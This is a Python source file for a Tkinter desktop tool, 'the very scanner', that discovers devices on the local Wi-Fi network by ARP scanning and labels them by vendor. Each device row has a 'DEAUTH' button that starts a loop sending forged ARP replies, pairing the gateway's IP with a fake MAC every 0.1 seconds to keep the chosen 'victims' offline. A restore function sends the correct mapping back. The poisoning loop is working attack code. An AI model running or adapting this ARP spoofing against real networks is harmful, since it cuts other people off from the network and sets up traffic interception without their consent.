'''clients scanner gui_app
version: 0.0.1
date: 26.05.2020
author: streanger
'''
import sys
import os
import re
import time
import ctypes
import subprocess
import configparser
import pkg_resources
from functools import partial
from threading import Thread
from tkinter import Tk, Frame, Label, Entry, Button, StringVar, HORIZONTAL, messagebox, ttk, font
from PIL import ImageTk, Image, ImageDraw, ImageOps
from scapy.all import ARP, Ether, srp, send
from mac_vendor_lookup import MacLookup


def timer(func):
    '''function wrapper, for measure execution time'''
    def wrapper(*args, **kwargs):
        before = time.time()
        val = func(*args, **kwargs)
        after = time.time()
        print("func: {}, elapsed time: {}s".format(func.__name__, after-before))
        return val
    return wrapper


def static_file_path(dir, file):
    ''' get path of the specified file from specified dir'''
    resource_path = '/'.join((dir, file))   # Do not use os.path.join()
    try:
        template = pkg_resources.resource_filename(__name__, resource_path)
    except KeyError:
        return 'none'   # empty string cause AttributeError, and non empty FileNotFoundError
    return template


def scanner():
    APP = ClientsScannerApp(master=Tk())
    APP.mainloop()
    return None


class ClientsScannerApp(Frame):
    '''gui application for showing local network guests; allows for deauth'''
    def __init__(self, master):
        # *********** INIT, HIDE, CLOSING ***********
        # self.hide_console()
        super().__init__(master)
        self.master.protocol("WM_DELETE_WINDOW", self.on_closing)


        # *********** GENERAL CONFIG ***********
        self.SOUND_ON = False
        self.NIGHT_MODE = False
        self.CONFIG_FILE_NAME = 'config.ini'
        config_section = 'GENERAL_CONFIG'
        content = self.read_config_file(self.CONFIG_FILE_NAME)
        if not content:
            default_settings = {
                config_section: {
                    'SOUND_ON': str(self.SOUND_ON),
                    'NIGHT_MODE': str(self.NIGHT_MODE),
                    }
                }
            self.update_config_file(self.CONFIG_FILE_NAME, default_settings)
        else:
            self.SOUND_ON = self.read_config_file_option(self.CONFIG_FILE_NAME, config_section, 'SOUND_ON')
            self.NIGHT_MODE = self.read_config_file_option(self.CONFIG_FILE_NAME, config_section, 'NIGHT_MODE')

        self.WIDGETS_BG_COLOR = self.master.cget('bg')
        self.WIDGETS_FG_COLOR = 'black'
        self.SEPARATOR_BG_COLOR = 'black'
        self.SWAP_IMAGE_COLOR = False

        if self.NIGHT_MODE:
            self.WIDGETS_BG_COLOR = '#47476b'
            self.WIDGETS_FG_COLOR = 'white'
            self.SEPARATOR_BG_COLOR = 'white'
            self.SWAP_IMAGE_COLOR = True


        # *********** SSID, BSSID ***********
        self.SSID, self.BSSID = self.get_ssid_bssid()
        self.SECTION_NAME = '{}_{}'.format(self.SSID, self.BSSID).replace(' ', '_')
        self.gateway_ip, self.gateway_mac = self.get_gateway(self.BSSID)
        self.target_ip = '{}/24'.format(self.gateway_ip)


        # *********** CLIENTS, PASSING DATA ***********
        self.CLIENTS_FILE_NAME = 'clients.ini'
        self.KNOWN_DEVICES = self.read_config_file(self.CLIENTS_FILE_NAME)
        self.CURRENT_NETWORK_DEVICES = self.filter_by_ssid(self.KNOWN_DEVICES, self.SSID)

        self.DEVICES_INFO = {}
        for key in self.CURRENT_NETWORK_DEVICES.keys():
            name = self.CURRENT_NETWORK_DEVICES[key]['name']
            self.DEVICES_INFO[key] = {'visible': False,
                                      'last_seen': time.time(),
                                      'deauth': False,
                                      'last_name': name}

        self.last_seen_cut_off_time = 30    # when client wasn't seen since this value,
                                            # its visible status -> False
        self.rows = {}                      # widgets reference
        self.entries = {}                   # entries reference


        # *********** SCROLLBAR ***********
        # canvas = Canvas(self.master, bg="yellow")
        # canvas.grid(column=8, row=0, rowspan=10, sticky="nes")
        # scrollbar = Scrollbar(self.master)
        # scrollbar.grid(column=8, row=0, rowspan=10, sticky='nes')
        # canvas.configure(yscrollcommand=scrollbar.set)
        # canvas.config(scrollregion=canvas.bbox("all"))      # Set the canvas scrolling region


        # *********** APP GUI, CONST, VARIABLES ***********
        # raised, sunken, flat, ridge, solid, groove
        self.RELIEF_TYPE = 'raised'
        self.ROW_RELIEF = 'raised'
        self.INFO_RELIEF = 'flat'
        self.TOP_RELIEF = 'groove'  # 'raised'
        self.IMG_RELIEF = 'groove'


        app_font = "DejaVu Sans Mono"

        self.APP_NAME_FONT = font.Font(family=app_font, size=13, weight="normal")
        self.MONO_FONT_NAME = font.Font(family=app_font, size=10, weight="normal")
        self.MONO_FONT_INFO = font.Font(family=app_font, size=8, weight="normal")
        self.CENTER_CHAR = ' '      # 'x'


        self.padx = 0
        self.pady = 1
        init_number_of_clients = len(list(self.CURRENT_NETWORK_DEVICES.keys()))
        init_number_of_clients = max(3, init_number_of_clients)
        init_height = round((init_number_of_clients + 1 + 1)*63.75)   # + 1(topbar) + 1(one empty space)
        self.master.geometry('{}x{}+333+50'.format(700, init_height))     # without scrollbar
        # self.master.geometry('{}x{}+333+50'.format(800, init_height))       # for scrollbar
        self.master.configure(background=self.WIDGETS_BG_COLOR)
        self.master.resizable(width=False, height=True)
        self.master.wm_title("gui_app")
        self.grid()


        # *********** CREATE WIDGETS ***********
        self.WIDGETS_LAST_KEY = 0
        devices_list = self.dict_to_widgets_list(self.CURRENT_NETWORK_DEVICES)
        self.create_widgets(devices_list)


        # *********** LIFT, GET FOCUS ***********
        self.master.attributes("-topmost", True)    # always on top
        self.master.update()
        self.master.attributes("-topmost", False)
        self.master.lift()                          # move window to the top
        self.master.focus_force()


        # *********** SEARCH FOR CLIENTS ***********
        self.CLOSE_THREAD = False
        self.hold = False
        self.update_clients_thread = Thread(target=self.search_clients_thread)
        self.update_clients_thread.start()


        # *********** DEAUTH STUFF ***********
        self.fake_mac = 'aa:bb:cc:dd:ee:ff'
        # 0.1 [s], its enought for keep victims offline
        self.deauth_wait_between_packets = 0.1
        self.clients_deauth_dict = {}
        self.deauth_thread = Thread(target=self.deauth_loop)
        self.deauth_thread.start()


        # *********** STORE DEVICES INFO ***********
        # self.store_status_thread = Thread(target=self.store_devices_status)
        # self.store_status_thread.start()


    def on_closing(self):
        '''
        handle closing
        https://stackoverflow.com/questions/111155/how-do-i-handle-the-window-close-event-in-tkinter
        '''
        self.hold = True

        if messagebox.askokcancel('Quit', 'Do you want to quit?'):
            # destroy main app
            self.master.destroy()

            # join threads etc
            self.CLOSE_THREAD = True
            self.update_clients_thread.join()
            print('update_clients_thread joined')
            self.deauth_thread.join()
            print('deauth_thread joined')

        else:
            # continue with searching clients
            self.hold = False

        return None


    def wrap_text(self, text, number):
        '''wrap text, to fit widget'''
        out = text[:number].center(number, self.CENTER_CHAR)
        return out


    def wrap_top_text(self, text):
        '''wrap text, to fit widget'''
        out = text[:35].center(35, self.CENTER_CHAR)
        return out


    @staticmethod
    def get_gateway(bssid=''):
        '''get gateway_ip and gateway_mac'''
        if os.name == 'nt':
            command = 'arp -a'
            cmd_output = subprocess.Popen(command,
                                          stdin=subprocess.PIPE,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE,
                                          encoding="cp852",
                                          universal_newlines=True)

            response = cmd_output.stdout.read()
            response_lines = response.splitlines()

            if not bssid:
                # it will fail, if connect any device over ethernet
                gateway_mac = re.search(r'([0-9a-f]{2}[:-]){5}([0-9a-f]{2})', response, re.I).group()
                gateway_ip = [line.split()[0] for line in response_lines if gateway_mac in line.split()][0]
                gateway_mac = gateway_mac.replace('-', ':')

            else:
                bssid_minus = bssid.replace(':', '-')
                gateway_ip = [line.split()[0] for line in response_lines if bssid_minus in line.split()][0]
                gateway_mac = bssid

        else:
            command = 'arp -n | grep wlan0 | head -n 1'
            response = subprocess.getoutput(command)
            gateway_ip, _, gateway_mac = response.split()[:3]

        return gateway_ip, gateway_mac


    def update_clients(self, clients):
        '''
        compare known clients with new found;
        separate unknown clients;
        save them into config file;
        update known clients;
        return new clients, to update gui
        '''

        clients_macs = [mac for mac, ip in clients.items()]
        current_network_macs = list(self.CURRENT_NETWORK_DEVICES.keys())
        new_macs = set(clients_macs).difference(current_network_macs)

        new_clients = {}
        for mac in new_macs:
            # store data about new clients
            try:
                mac_lookup_info = MacLookup().lookup(mac)
            except KeyError:
                mac_lookup_info = 'device not recognized'

            name = self.KNOWN_DEVICES.get(mac, {}).get('name', 'UNKNOWN')
            new_clients[mac] = {
                'name': name,
                'vendor': mac_lookup_info,
                'ip': clients[mac],
                'mac': mac,
                'ssid': self.SSID,
                'bssid': self.BSSID,
                }

            # update of DEVICES_INFO
            self.DEVICES_INFO[mac] = {'visible': True, 'last_seen': time.time(), 'deauth': False, 'last_name': name}


        # update of CURRENT_NETWORK_DEVICES
        self.CURRENT_NETWORK_DEVICES = {**self.CURRENT_NETWORK_DEVICES, **new_clients}


        for mac in self.CURRENT_NETWORK_DEVICES.keys():
            if mac in clients_macs:
                self.DEVICES_INFO[mac]['last_seen'] = time.time()

                if not self.DEVICES_INFO[mac]['visible']:
                    # if red changed to green (not visible -> visible)
                    # beep for each item occurs
                    if self.SOUND_ON:
                        print('\a', end='\r')
                self.DEVICES_INFO[mac]['visible'] = True
            else:
                if time.time() - self.DEVICES_INFO[mac]['last_seen'] > self.last_seen_cut_off_time:
                    self.DEVICES_INFO[mac]['visible'] = False

        return new_clients


    def search_clients_thread(self):
        '''function for continous searching as thread'''
        while True:
            if self.hold:
                if self.CLOSE_THREAD:
                    return False
                continue

            clients = self.get_clients(target_ip=self.target_ip, iterations=1)
            clients.pop(self.fake_mac, None)    # prevent showing fake mac, while deauth works
            # print('clients found:\n\t{}'.format(clients))

            if self.CLOSE_THREAD:
                return False

            new_clients = self.update_clients(clients)                      # compare found clients with already known
            devices_list = self.dict_to_widgets_list(new_clients)           # convert dict to list for gui
            self.create_widgets(devices_list)                               # create widgets for new clients
            self.update_config_file(self.CLIENTS_FILE_NAME, new_clients)    # update config file for new clients
            self.update_widgets(clients)                                    # update widgets for all clients
        return None


    # @timer
    def update_widgets(self, clients):
        '''update ip and status label in widgets for all devices (CURRENT_NETWORK_DEVICES)'''
        for mac in self.CURRENT_NETWORK_DEVICES.keys():
            current_row = self.rows.get(mac, False)

            if not current_row:
                continue

            status_label = current_row.get('status_label')
            info_frame_ip = current_row.get('info_frame_ip')


            if self.DEVICES_INFO[mac]['visible']:
                bg_color = 'green'
            else:
                bg_color = 'red'

            status_label.config(bg=bg_color)
            device_ip = clients.get(mac, False)
            if device_ip:
                if device_ip != (info_frame_ip.cget('text')).strip():
                    info_frame_ip.config(text=self.wrap_text(device_ip, 35))
        return None


    # @timer
    @staticmethod
    def get_clients(target_ip, iterations=1):
        '''get all clients in local network; return list of (ip, mac)'''
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        clients = []
        for _ in range(iterations):
            try:
                result = srp(packet, timeout=1.0, verbose=0)[0]

            except OSError:
                # print('OSError catched, while searching for clients...')
                time.sleep(2)
                break

            clients.extend([(received.psrc, received.hwsrc.lower()) for (sent, received) in result])

        clients = list(set(clients))
        clients = {mac:ip for ip, mac in clients}   # at least i need dict
        time.sleep(1)
        return clients


    # @timer
    def entry_callback(self, index, event):
        '''entries callback'''

        # center text on current entry
        mac, entry_widget = self.entries[index]

        # check if entry text changed
        last_name = self.DEVICES_INFO[mac]['last_name']
        entry_text = entry_widget.get()
        entry_text = entry_text.strip()
        self.DEVICES_INFO[mac]['last_name'] = entry_text    # update last name
        self.entries[index][1].delete(0, 'end')
        self.entries[index][1].insert(0, entry_text.center(22))


        if last_name != entry_text:
            # store specified name in config file
            data = {mac: {'name': entry_text}}
            self.update_config_file(self.CLIENTS_FILE_NAME, data)

            # update image
            image_label = self.rows.get(mac).get('image_label')
            img = self.get_proper_image(entry_text)
            image_label.config(image=img)
            image_label.image = img


        # set focus on next entry
        entries_keys = list(self.entries.keys())
        next_entry_index = index+1
        if next_entry_index > max(entries_keys):
            next_entry_index = 0

            self.master.focus()     # if you are not irritated by blinking cursor, just uncomment this two lines
            return None             # then cursor will jump from last entry to the first one

        self.entries[next_entry_index][1].focus()
        return None


    @staticmethod
    def dict_to_widgets_list(devices):
        '''convert dict with devices to list, possible to use by create_widgets method'''

        # convert dict to list
        devices_list = []
        for data in devices.values():
            devices_list.append((
                data['name'],
                data['vendor'],
                data['ip'],
                data['mac'],))

        # sort list by ip (last part)
        try:
            devices_list = sorted(devices_list, key=lambda x: int(x[2].split('.')[-1]))
        except ValueError:
            pass
        return devices_list


    def get_proper_image(self, name, config=False):
        '''get proper image, for specified name;
        if image does not exists, draw circle'''


        if not config:
            pairs = [
                ('router', 'router.png'),
                ('pc', 'pc.png'),
                ('laptop', 'laptop.png'),
                ('phone', 'phone.png'),
                ('watch', 'watch.png'),
                ('raspberry', 'raspberry.png'),
                ]

        else:
            pairs = [
                ('sound_off', 'sound_off.png'),
                ('sound_on', 'sound_on.png'),
                ('night_mode', 'night_mode.png'),
                ('day_mode', 'day_mode.png'),
                ]

        img_file = 'none'
        name = name.lower()

        for item, file in pairs:
            if item in name:
                img_file = file
                break

        try:
            img_path = static_file_path('images', img_file)
            img = Image.open(img_path)

        except FileNotFoundError:
            # draw circle 32x32 px
            img = Image.new('RGBA', (32, 32))
            draw = ImageDraw.Draw(img)
            draw.ellipse((0, 0, 31, 31), outline='black', width=2)


        # swap image color, to fit current night mode
        if self.SWAP_IMAGE_COLOR:
            if img.mode == 'RGBA':
                r_origin, g_origin, b_origin, a_origin = img.split()
                rgb_image = Image.merge('RGB', (r_origin, g_origin, b_origin))
                inverted_image = ImageOps.invert(rgb_image)
                r_inv, g_inv, b_inv = inverted_image.split()
                img = Image.merge('RGBA', (r_inv, g_inv, b_inv, a_origin))
            else:
                img = ImageOps.invert(img)

        img.thumbnail((32, 32), Image.ANTIALIAS)
        img = ImageTk.PhotoImage(img)
        return img


    def switch_night_mode(self):
        '''switch night mode'''
        self.NIGHT_MODE = not self.NIGHT_MODE
        # print('night mode: {}'.format(self.NIGHT_MODE))

        if self.NIGHT_MODE:
            image_name = 'night_mode'

            # todo
            self.WIDGETS_BG_COLOR = '#47476b'
            self.WIDGETS_FG_COLOR = 'white'
            self.SEPARATOR_BG_COLOR = 'white'
            self.SWAP_IMAGE_COLOR = True

        else:
            image_name = 'day_mode'

            # todo
            self.WIDGETS_BG_COLOR = self.master.cget('bg')
            self.WIDGETS_FG_COLOR = 'black'
            self.SWAP_IMAGE_COLOR = False
            self.SEPARATOR_BG_COLOR = 'black'


        img = self.get_proper_image(image_name, config=True)
        self.top_night_mode_image.config(image=img)
        self.top_night_mode_image.image = img

        return None


    def switch_sound_mode(self):
        '''switch sound mode'''
        self.SOUND_ON = not self.SOUND_ON
        # print('sound mode: {}'.format(self.SOUND_ON))

        if self.SOUND_ON:
            image_name = 'sound_on'
        else:
            image_name = 'sound_off'

        img = self.get_proper_image(image_name, config=True)
        self.top_sound_mode_image.config(image=img)
        self.top_sound_mode_image.image = img

        return None


    def create_widgets(self, devices_list):
        '''create widgets from dict object'''
        for index, data in enumerate(devices_list):
            (username, device_vendor, device_ip, device_mac) = data
            key = 0

            # ************** define topbar frames **************
            self.top_frame_left = Frame(self.master, borderwidth=1, relief=self.RELIEF_TYPE)
            self.top_frame_left.grid(row=0, rowspan=2, column=0, columnspan=2, sticky='ew', ipady=0)
            self.top_frame_center = Frame(self.master, borderwidth=1, relief=self.RELIEF_TYPE)
            self.top_frame_center.grid(row=0, rowspan=2, column=2, columnspan=1, sticky='ew', ipady=0)
            self.top_frame_right = Frame(self.master, borderwidth=1, relief=self.RELIEF_TYPE)
            self.top_frame_right.grid(row=0, rowspan=2, column=3, columnspan=3, sticky='ew', ipady=0)


            # ************** topbar left **************
            ssid_text = self.wrap_text(' SSID: {}'.format(self.SSID), 33)
            self.top_ssid = Label(self.top_frame_left, relief=self.TOP_RELIEF, font=self.MONO_FONT_INFO, text=ssid_text, bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.top_ssid.grid(row=0, rowspan=1, column=0, columnspan=2, sticky='ew', pady=1, ipady=4)

            bssid_text = self.wrap_text('BSSID: {}'.format(self.BSSID), 33)
            self.top_bssid = Label(self.top_frame_left, relief=self.TOP_RELIEF, font=self.MONO_FONT_INFO, text=bssid_text, bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.top_bssid.grid(row=1, rowspan=1, column=0, columnspan=2, sticky='ew', pady=1, ipady=4)


            # ************** topbar center **************
            self.top_night_mode_button = Button(self.top_frame_center, font=self.MONO_FONT_INFO, text='NIGHT\nMODE', command=self.switch_night_mode, bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.top_night_mode_button.grid(row=0, rowspan=1, column=0, padx=self.padx, pady=self.pady, ipadx=11, ipady=10, sticky='ew')

            if self.NIGHT_MODE:
                image_name = 'night_mode'
            else:
                image_name = 'day_mode'

            img = self.get_proper_image(image_name, config=True)
            self.top_night_mode_image = Label(self.top_frame_center, relief=self.TOP_RELIEF, image=img, bg=self.WIDGETS_BG_COLOR)
            self.top_night_mode_image.image = img
            self.top_night_mode_image.grid(row=0, rowspan=1, column=1, padx=self.padx, pady=self.pady, ipadx=11, ipady=10, sticky='ew')

            self.top_sound_mode_button = Button(self.top_frame_center, font=self.MONO_FONT_INFO, text='SOUND\nMODE', command=self.switch_sound_mode, bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.top_sound_mode_button.grid(row=0, rowspan=1, column=2, padx=self.padx, pady=self.pady, ipadx=11, ipady=10, sticky='ew')

            if self.SOUND_ON:
                image_name = 'sound_on'
            else:
                image_name = 'sound_off'

            img = self.get_proper_image(image_name, config=True)
            self.top_sound_mode_image = Label(self.top_frame_center, relief=self.TOP_RELIEF, image=img, bg=self.WIDGETS_BG_COLOR)
            self.top_sound_mode_image.image = img
            self.top_sound_mode_image.grid(row=0, rowspan=1, column=3, padx=self.padx, pady=self.pady, ipadx=11, ipady=10, sticky='ew')


            # ************** topbar right **************
            self.top_right_label = Label(self.top_frame_right, relief=self.TOP_RELIEF, font=self.APP_NAME_FONT, text='the very\nscanner', bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.top_right_label.grid(row=0, rowspan=2, column=0, columnspan=1, sticky="nswe", pady=1, ipady=5, ipadx=60)


            key = 2


            # ************** main rows **************

            # just workaround, nothing more :)
            key += (self.WIDGETS_LAST_KEY + index)

            img = self.get_proper_image(username)
            self.image_label = Label(self.master, relief=self.IMG_RELIEF, image=img, bg=self.WIDGETS_BG_COLOR)
            self.image_label.image = img                #remember to keep a reference
            self.image_label.grid(row=key*2, column=0, padx=self.padx, pady=self.pady, ipady=11, ipadx=8)


            # Label -> Entry widget
            self.str_var = StringVar()
            self.client_name_entry = Entry(self.master, relief=self.RELIEF_TYPE, font=self.MONO_FONT_NAME, textvariable=self.str_var)
            self.client_name_entry.insert(0, username.center(22))
            self.client_name_entry.bind('<Return>', partial(self.entry_callback, key))
            self.client_name_entry.grid(row=key*2, column=1, padx=self.padx, pady=self.pady, ipadx=10, ipady=20)
            self.entries[key] = (device_mac, self.client_name_entry)


            # Frame (3 labels -> device, ip, mac)
            self.info_frame = Frame(self.master, borderwidth=1, relief=self.RELIEF_TYPE)
            self.info_frame.grid(row=key*2, column=2, padx=self.padx, pady=self.pady)

            # device
            self.info_frame_device = Label(self.info_frame, relief=self.INFO_RELIEF, font=self.MONO_FONT_INFO, text=self.wrap_text(device_vendor, 35), bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.info_frame_device.grid(row=0, column=0, padx=0, pady=0)

            # ip
            self.info_frame_ip = Label(self.info_frame, relief=self.INFO_RELIEF, font=self.MONO_FONT_INFO, text=self.wrap_text(device_ip, 35), bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.info_frame_ip.grid(row=1, column=0, padx=0, pady=0)

            # mac
            self.info_frame_mac = Label(self.info_frame, relief=self.INFO_RELIEF, font=self.MONO_FONT_INFO, text=self.wrap_text(device_mac, 35), bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.info_frame_mac.grid(row=2, column=0, padx=0, pady=0)


            # Label (visible status)
            self.status_label = Label(self.master, relief="ridge", font=self.MONO_FONT_INFO, text='VISIBLE\nSTATUS', bg='red')
            self.status_label.grid(row=key*2, column=3, padx=self.padx, pady=self.pady+1, ipadx=8, ipady=13)


            # Label (deauth status)
            self.deauth_label = Label(self.master, relief="ridge", font=self.MONO_FONT_INFO, text='DEAUTH\nSTATUS', bg='green')
            self.deauth_label.grid(row=key*2, column=4, padx=self.padx, pady=self.pady+1, ipadx=10, ipady=13)


            # Button for some action
            self.deauth_button = Button(self.master, font=self.MONO_FONT_INFO, text=self.wrap_text('DEAUTH', 8), command=lambda q=device_mac: self.deauth(q), bg=self.WIDGETS_BG_COLOR, fg=self.WIDGETS_FG_COLOR)
            self.deauth_button.grid(row=key*2, column=5, padx=self.padx, pady=self.pady, ipadx=0, ipady=17)


            # Separator
            ttk.Separator(self.master, orient=HORIZONTAL).grid(row=key*2+1, column=0, columnspan=6, sticky='ew', ipady=0)
            style = ttk.Style()
            style.configure('TSeparator', background=self.SEPARATOR_BG_COLOR)


            self.rows[device_mac] = {
                'status_label': self.status_label,
                'info_frame_device': self.info_frame_device,
                'info_frame_ip': self.info_frame_ip,
                'deauth_label': self.deauth_label,
                'deauth_button': self.deauth_button,
                'image_label': self.image_label
                }


        self.WIDGETS_LAST_KEY += len(devices_list)        # set the last key
        return True


    def deauth(self, mac):
        '''update deauth widgets, deauth dict and devices info'''

        # ************** UPDATE WIDGETS **************
        deauth_flag = self.DEVICES_INFO[mac]['deauth']

        if not deauth_flag:
            deauth_bg_color = 'red'
            deauth_button_text = 'RESTORE'
        else:
            deauth_bg_color = 'green'
            deauth_button_text = 'DEAUTH'

        # get widgets for current row
        current_row = self.rows.get(mac, False)

        if not current_row:
            return False

        deauth_label = current_row.get('deauth_label')
        deauth_button = current_row.get('deauth_button')


        deauth_label.config(bg=deauth_bg_color,)
        deauth_button.config(text=self.wrap_text(deauth_button_text, 8))
        victim_ip = self.CURRENT_NETWORK_DEVICES[mac]['ip']
        victim_mac = mac
        client = (victim_ip, victim_mac)
        deauth_flag_reverse = not deauth_flag


        # ************** UPDATE CLIENTS_DEAUTH_DICT **************
        self.clients_deauth_dict[client] = deauth_flag_reverse


        # ************** UPDATE DEVICES_INFO  **************
        self.DEVICES_INFO[mac]['deauth'] = deauth_flag_reverse
        return True


    def deauth_loop(self):
        '''deauth clients specified in clients_deauth_dict'''
        while True:
            if self.hold:
                # print('hold')
                if self.CLOSE_THREAD:
                    return False
                continue

            if self.CLOSE_THREAD:
                return False

            if not self.clients_deauth_dict:
                time.sleep(0.1)
                # print('waiting on clients to deauth', end='\r', flush=True)
                continue

            # copy, to prevent changes in dict, while iterating
            clients_dict_copy = self.clients_deauth_dict.copy()

            for (client, deauth_flag) in clients_dict_copy.items():
                victim_ip, victim_mac = client

                # if not self.DEVICES_INFO[victim_mac]['visible']:
                    # print('not visible, no poisoning: {}'.format(client))
                    # continue

                if deauth_flag:
                    self.poison(victim_ip, victim_mac, self.gateway_ip, self.fake_mac)
                    print('poisoning victim: {}'.format(client))

                else:
                    self.restore(victim_ip, victim_mac, self.gateway_ip, self.gateway_mac)
                    print('restoring victim: {}'.format(client))

                    # remove client from dictionary, to not send restore every time
                    self.clients_deauth_dict.pop(client)

            time.sleep(self.deauth_wait_between_packets)
        return None


    @staticmethod
    def poison(victim_ip, victim_mac, gateway_ip, fake_mac):
        '''Send the victim an ARP packet pairing the gateway ip with the wrong mac address'''
        try:
            packet = ARP(op=2, psrc=gateway_ip, hwsrc=fake_mac, pdst=victim_ip, hwdst=victim_mac)
            send(packet, verbose=0)

        except OSError as err:
            print('error catched: {}'.format(err))

        return None


    @staticmethod
    def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
        '''Send the victim an ARP packet pairing the gateway ip with the correct mac address'''
        try:
            packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
            send(packet, verbose=0)

        except OSError as err:
            print('error catched: {}'.format(err))

        return None


    @staticmethod
    def get_ssid_bssid():
        '''get ssid(network name) and bssid(gateway mac)'''
        os_name = os.name

        if os_name == 'nt':
            command = 'Netsh WLAN show interfaces'
            cmd_output = subprocess.Popen(command,
                                          stdin=subprocess.PIPE,
                                          stdout=subprocess.PIPE,
                                          stderr=subprocess.PIPE,
                                          encoding="cp852",
                                          universal_newlines=True)

            response = cmd_output.stdout.readlines()
            ssid_line = [line for line in response if 'SSID' in line.split()]
            bssid_line = [line for line in response if 'BSSID' in line.split()]

            ssid = ''
            if ssid_line:
                ssid = (ssid_line[0].split(':', 1)[1]).strip()

            bssid = ''
            if bssid_line:
                bssid = (bssid_line[0].split(':', 1)[1]).strip()

        else:
            command = 'iwgetid'
            command = 'iwconfig'
            response = subprocess.getoutput(command).splitlines()

            essid_line = [line for line in response if 'ESSID:' in line][0]
            bssid_line = [line for line in response if 'Access Point:' in line][0]
            ssid = (essid_line.split('ESSID:', 1)[1]).strip().replace('"', '')
            bssid = (bssid_line.split('Access Point:', 1)[1]).strip().lower()

        return (ssid, bssid)


    @staticmethod
    def update_config_file(file, data):
        '''write to config file'''
        if not data:
            return False

        config = configparser.ConfigParser()
        config.read(file)

        for section, content in data.items():
            try:
                config[section]
            except KeyError:
                config[section] = {}

            for key, value in content.items():
                config.set(section, key, value)

        with open(file, 'w') as config_file:
            config.write(config_file)

        return True


    @staticmethod
    def read_config_file_option(file, section, option):
        '''read single option from config file'''
        config = configparser.ConfigParser()
        config.read(file)
        value = config.getboolean(section, option)
        return value


    @staticmethod
    def read_config_file(file):
        '''read from config file'''
        config = configparser.ConfigParser()
        config.read(file)
        sections = config.sections()
        content = {}
        for section in sections:
            content[section] = dict(config[section])
        return content


    @staticmethod
    def filter_by_ssid(data, ssid):
        '''filter clients. Think of change ssid parameter, to filter as tuple of data'''
        out = {}
        for (key, value) in data.items():
            if value['ssid'] == ssid:
                out[key] = value
        return out


    @staticmethod
    def hide_console():
        '''hide console window'''
        if os.name == 'nt':
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

        return None


    @staticmethod
    def store_devices_status():
        '''store actual status for current network devices'''
        print('store_status_thread works')

        time_between = 120  # [s]
        while True:
            time.sleep(time_between)

            # save info to file
        return None


if __name__ == "__main__":
    scanner()
